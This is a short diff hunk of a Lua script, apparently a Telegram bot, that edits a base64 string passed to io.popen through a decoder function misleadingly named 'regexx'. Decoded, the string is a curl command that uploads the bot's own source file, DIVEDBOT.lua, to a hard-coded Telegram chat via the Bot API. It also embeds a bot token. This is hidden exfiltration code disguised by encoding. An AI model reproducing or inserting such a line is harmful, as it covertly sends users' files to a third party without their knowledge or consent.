@@ -225,7 +225,7 @@ function regexx(data)
         return string.char(c)
     end))
 end
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDM2MDM5NDg6QUFHaHhWWnRVMmY4TlpTck1KYmtQeE16dXFZajdvNUFVVmcvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1ARElWRURCT1QubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDM2MDM5NDg6QUFHaHhWWnRVMmY4TlpTck1KYmtQeE16dXFZajdvNUFVVmcvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1ARElWRURCT1QubHVhIg'))
 
 
 function Sudo(msg) 
